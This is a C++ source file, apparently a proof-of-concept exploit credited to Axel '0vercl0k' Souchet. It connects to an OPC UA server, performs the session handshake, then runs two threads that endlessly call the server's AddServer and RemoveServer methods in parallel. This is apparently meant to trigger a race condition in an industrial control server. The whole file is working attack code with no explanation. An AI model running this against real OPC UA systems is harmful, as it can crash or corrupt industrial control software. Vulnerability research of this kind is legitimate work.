// Axel '0vercl0k' Souchet - January 10 2023
#include <algorithm>
#include <fmt/printf.h>
#include <memory>
#include <opcua/oua.h>
#include <opcua/socket.h>
#include <thread>
#include <vector>

int main(int argc, char* argv[]) {
    sock::WSAInitializer_t Wsa;
    const char* EndpointDefault = "127.0.0.1";
    const uint32_t PortDefault = 48050;
    const char* Endpoint = argc >= 2 ? argv[1] : EndpointDefault;
    const uint32_t Port = argc >= 3 ? std::strtoul(argv[2], nullptr, 10) : PortDefault;

    fmt::print("Throwing against {}:{}..\n", Endpoint, Port);

    auto Add = [&]() {
        std::vector<uint8_t> ReceiveBuffer;
        ReceiveBuffer.reserve(128);

        fmt::print("Establishing a connection..\n");
        const auto& Socket = sock::Connect(Endpoint, Port);
        if (!Socket) {
            fmt::print("Connect failed\n");
            return EXIT_FAILURE;
        }

        fmt::print("Sending hello..\n");
        oua::Hello_t Hello;
        Hello.EndpointUrl = "doar-e.github.io ftw!";
        if (!sock::Send(*Socket, Hello)) {
            fmt::print("Send Hello failed\n");
            return EXIT_FAILURE;
        }

        if (!sock::RecvInto(*Socket, ReceiveBuffer)) {
            fmt::print("RecvInto Acknowledge failed\n");
            return EXIT_FAILURE;
        }

        oua::Acknowledge_t Acknowledge;
        Acknowledge.DeserializeFrom(ReceiveBuffer);
        fmt::print("Received acknowledge message:\n");
        Acknowledge.Print(2);

        fmt::print("Sending open secure channel request..\n");
        oua::OpenSecureChannel_t OpenSecureChannel;
        if (!sock::Send(*Socket, OpenSecureChannel)) {
            fmt::print("Send OpenSecureChannel failed\n");
            return EXIT_FAILURE;
        }

        ReceiveBuffer.clear();
        if (!sock::RecvInto(*Socket, ReceiveBuffer)) {
            fmt::print("RecvInto failed\n");
            return EXIT_FAILURE;
        }

        oua::OpenSecureChannelResponse_t OpenSecureChannelResponse;
        OpenSecureChannelResponse.DeserializeFrom(ReceiveBuffer);
        fmt::print("Received open secure channel response..\n");

        oua::SecureChannelHeader_t ChannelHdr;
        ChannelHdr.SecureChannelId =
            OpenSecureChannelResponse.ChannelSecurityToken.ChannelId;
        ChannelHdr.SecureTokenId =
            OpenSecureChannelResponse.ChannelSecurityToken.TokenId;
        ChannelHdr.SecureSequenceNumber =
            OpenSecureChannel.ChannelHeader.SequenceNumber;

        fmt::print("Sending get endpoints request..\n");
        oua::GetEndpointsRequest_t GetEndpointsRequest;
        ChannelHdr.SecureSequenceNumber++;
        ChannelHdr.SecureRequestId = 0xdeadbeef;
        GetEndpointsRequest.ChannelHeader = ChannelHdr;
        if (!sock::Send(*Socket, GetEndpointsRequest)) {
            fmt::print("Send GetEndpointsRequest fragment failed\n");
            return EXIT_FAILURE;
        }

        ReceiveBuffer.clear();
        if (!sock::RecvInto(*Socket, ReceiveBuffer)) {
            fmt::print("RecvInto failed\n");
            return EXIT_FAILURE;
        }

        oua::GetEndpointsResponse_t GetEndpointsResponse;
        GetEndpointsResponse.DeserializeFrom(ReceiveBuffer);
        fmt::print("Received get endpoints response..\n");

        fmt::print("Sending create session request..\n");
        oua::CreateSessionRequest_t CreateSessionRequest;
        ChannelHdr.SecureSequenceNumber++;
        ChannelHdr.SecureRequestId = 0xbaadf00d;
        CreateSessionRequest.ChannelHeader = ChannelHdr;

        if (!sock::Send(*Socket, CreateSessionRequest)) {
            fmt::print("Send CreateSessionRequest fragment failed\n");
            return EXIT_FAILURE;
        }

        ReceiveBuffer.clear();
        if (!sock::RecvInto(*Socket, ReceiveBuffer)) {
            fmt::print("RecvInto failed\n");
            return EXIT_FAILURE;
        }

        oua::CreateSessionResponse_t CreateSessionResponse;
        CreateSessionResponse.DeserializeFrom(ReceiveBuffer);
        const auto& AuthenticationToken = CreateSessionResponse.AuthenticationToken;
        fmt::print("Received create session response..\n");

        fmt::print("Sending activation session request..\n");
        oua::ActivateSessionRequest_t ActivateSessionRequest;
        ChannelHdr.SecureSequenceNumber++;
        ChannelHdr.SecureRequestId = 0x11223344;
        ActivateSessionRequest.ChannelHeader = ChannelHdr;
        ActivateSessionRequest.RequestHeader.AuthenticationToken =
            AuthenticationToken;

        if (!sock::Send(*Socket, ActivateSessionRequest)) {
            fmt::print("Send ActivateSessionRequest fragment failed\n");
            return EXIT_FAILURE;
        }

        ReceiveBuffer.clear();
        if (!sock::RecvInto(*Socket, ReceiveBuffer)) {
            fmt::print("RecvInto failed\n");
            return EXIT_FAILURE;
        }

        oua::ActivateSessionResponse_t ActivateSessionResponse;
        ActivateSessionResponse.DeserializeFrom(ReceiveBuffer);
        fmt::print("Received activate session response..\n");

        while (true) {
            oua::CallRequest_t AddServerCallRequest;
            ChannelHdr.SecureRequestId = 0x44332211;
            ChannelHdr.SecureSequenceNumber++;
            AddServerCallRequest.ChannelHeader = ChannelHdr;
            AddServerCallRequest.RequestHeader.AuthenticationToken =
                AuthenticationToken;

            oua::CallMethodRequest_t AddServerMethod;
            AddServerMethod.ObjectId = oua::NodeId_t(1, "OpcUaServers.MethodSet");
            AddServerMethod.MethodId = oua::NodeId_t(1, "OpcUaServers.AddServer");
            AddServerMethod.InputArguments.emplace_back("foobar");
            AddServerMethod.InputArguments.emplace_back("sbra");
            AddServerCallRequest.MethodsToCall.push_back(std::move(AddServerMethod));

            if (!sock::Send(*Socket, AddServerCallRequest)) {
                fmt::print("Send AddServerCallRequest fragment failed\n");
                return EXIT_FAILURE;
            }

            ReceiveBuffer.clear();
            if (!sock::RecvInto(*Socket, ReceiveBuffer)) {
                fmt::print("RecvInto failed\n");
                return EXIT_FAILURE;
            }
        }
    };

    auto Remove = [&]() {
        std::vector<uint8_t> ReceiveBuffer;
        ReceiveBuffer.reserve(128);

        fmt::print("Establishing a connection..\n");
        const auto& Socket = sock::Connect(Endpoint, Port);
        if (!Socket) {
            fmt::print("Connect failed\n");
            return EXIT_FAILURE;
        }

        fmt::print("Sending hello..\n");
        oua::Hello_t Hello;
        Hello.EndpointUrl = "doar-e.github.io ftw!";
        if (!sock::Send(*Socket, Hello)) {
            fmt::print("Send Hello failed\n");
            return EXIT_FAILURE;
        }

        if (!sock::RecvInto(*Socket, ReceiveBuffer)) {
            fmt::print("RecvInto Acknowledge failed\n");
            return EXIT_FAILURE;
        }

        oua::Acknowledge_t Acknowledge;
        Acknowledge.DeserializeFrom(ReceiveBuffer);
        fmt::print("Received acknowledge message:\n");
        Acknowledge.Print(2);

        fmt::print("Sending open secure channel request..\n");
        oua::OpenSecureChannel_t OpenSecureChannel;
        if (!sock::Send(*Socket, OpenSecureChannel)) {
            fmt::print("Send OpenSecureChannel failed\n");
            return EXIT_FAILURE;
        }

        ReceiveBuffer.clear();
        if (!sock::RecvInto(*Socket, ReceiveBuffer)) {
            fmt::print("RecvInto failed\n");
            return EXIT_FAILURE;
        }

        oua::OpenSecureChannelResponse_t OpenSecureChannelResponse;
        OpenSecureChannelResponse.DeserializeFrom(ReceiveBuffer);
        fmt::print("Received open secure channel response..\n");

        oua::SecureChannelHeader_t ChannelHdr;
        ChannelHdr.SecureChannelId =
            OpenSecureChannelResponse.ChannelSecurityToken.ChannelId;
        ChannelHdr.SecureTokenId =
            OpenSecureChannelResponse.ChannelSecurityToken.TokenId;
        ChannelHdr.SecureSequenceNumber =
            OpenSecureChannel.ChannelHeader.SequenceNumber;

        fmt::print("Sending get endpoints request..\n");
        oua::GetEndpointsRequest_t GetEndpointsRequest;
        ChannelHdr.SecureSequenceNumber++;
        ChannelHdr.SecureRequestId = 0xdeadbeef;
        GetEndpointsRequest.ChannelHeader = ChannelHdr;
        if (!sock::Send(*Socket, GetEndpointsRequest)) {
            fmt::print("Send GetEndpointsRequest fragment failed\n");
            return EXIT_FAILURE;
        }

        ReceiveBuffer.clear();
        if (!sock::RecvInto(*Socket, ReceiveBuffer)) {
            fmt::print("RecvInto failed\n");
            return EXIT_FAILURE;
        }

        oua::GetEndpointsResponse_t GetEndpointsResponse;
        GetEndpointsResponse.DeserializeFrom(ReceiveBuffer);
        fmt::print("Received get endpoints response..\n");

        fmt::print("Sending create session request..\n");
        oua::CreateSessionRequest_t CreateSessionRequest;
        ChannelHdr.SecureSequenceNumber++;
        ChannelHdr.SecureRequestId = 0xbaadf00d;
        CreateSessionRequest.ChannelHeader = ChannelHdr;

        if (!sock::Send(*Socket, CreateSessionRequest)) {
            fmt::print("Send CreateSessionRequest fragment failed\n");
            return EXIT_FAILURE;
        }

        ReceiveBuffer.clear();
        if (!sock::RecvInto(*Socket, ReceiveBuffer)) {
            fmt::print("RecvInto failed\n");
            return EXIT_FAILURE;
        }

        oua::CreateSessionResponse_t CreateSessionResponse;
        CreateSessionResponse.DeserializeFrom(ReceiveBuffer);
        const auto& AuthenticationToken = CreateSessionResponse.AuthenticationToken;
        fmt::print("Received create session response..\n");

        fmt::print("Sending activation session request..\n");
        oua::ActivateSessionRequest_t ActivateSessionRequest;
        ChannelHdr.SecureSequenceNumber++;
        ChannelHdr.SecureRequestId = 0x11223344;
        ActivateSessionRequest.ChannelHeader = ChannelHdr;
        ActivateSessionRequest.RequestHeader.AuthenticationToken =
            AuthenticationToken;

        if (!sock::Send(*Socket, ActivateSessionRequest)) {
            fmt::print("Send ActivateSessionRequest fragment failed\n");
            return EXIT_FAILURE;
        }

        ReceiveBuffer.clear();
        if (!sock::RecvInto(*Socket, ReceiveBuffer)) {
            fmt::print("RecvInto failed\n");
            return EXIT_FAILURE;
        }

        oua::ActivateSessionResponse_t ActivateSessionResponse;
        ActivateSessionResponse.DeserializeFrom(ReceiveBuffer);
        fmt::print("Received activate session response..\n");

        while (true) {
            oua::CallRequest_t RemoveServerCallRequest;
            ChannelHdr.SecureRequestId = 0x44332211;
            ChannelHdr.SecureSequenceNumber++;
            RemoveServerCallRequest.ChannelHeader = ChannelHdr;
            RemoveServerCallRequest.RequestHeader.AuthenticationToken =
                AuthenticationToken;

            oua::CallMethodRequest_t RemoveServerMethod;
            RemoveServerMethod.ObjectId = oua::NodeId_t(1, "OpcUaServers.MethodSet");
            RemoveServerMethod.MethodId =
                oua::NodeId_t(1, "OpcUaServers.RemoveServer");
            RemoveServerMethod.InputArguments.emplace_back("foobar");
            RemoveServerCallRequest.MethodsToCall.push_back(
                std::move(RemoveServerMethod));

            if (!sock::Send(*Socket, RemoveServerCallRequest)) {
                fmt::print("Send RemoveServerCallRequest fragment failed\n");
                return EXIT_FAILURE;
            }

            ReceiveBuffer.clear();
            if (!sock::RecvInto(*Socket, ReceiveBuffer)) {
                fmt::print("RecvInto failed\n");
                return EXIT_FAILURE;
            }
        }
    };

    std::thread First(Add);
    std::thread Second(Remove);

    First.join();
    Second.join();

    fmt::print("Done\n");
    return EXIT_SUCCESS;
}
